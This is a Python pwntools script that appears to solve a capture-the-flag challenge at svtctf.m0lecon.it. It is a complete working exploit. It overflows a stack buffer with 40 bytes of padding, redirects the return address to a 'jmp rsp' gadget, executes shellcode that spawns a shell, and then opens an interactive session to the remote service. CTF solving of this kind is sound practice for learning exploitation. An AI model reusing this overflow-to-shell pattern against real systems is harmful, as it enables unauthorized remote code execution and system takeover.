#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13445

context.update(arch= 'amd64', os='linux')

def make_payload():
    #get assembly to open a shell
    shellcode = shellcraft.sh()

    #assemble it into bytes
    shellcode_b = asm(shellcode)

    # Found via ROPgadget: 0x000000000040118d : jmp rsp
    jmp_rsp = 0x40118d

    payload = b'A' * 40          # Fill buffer + RBP
    payload += p64(jmp_rsp)      # Overwrite RET with address of 'jmp rsp'
    payload += shellcode_b         # Shellcode at the top of the stack (after returning), pointed by RSP
    
    #print(payload)

    return payload

def main():

    server = remote(HOST, PORT)
    #server.interactive()
    server.recvuntil(b'Enter your input:', timeout=1)

    payload = make_payload()
    print(f"Sending payload of length {len(payload)}")
    server.sendline(payload)

    # read remainder of program output
    server.interactive()

if __name__ == '__main__':
    main()
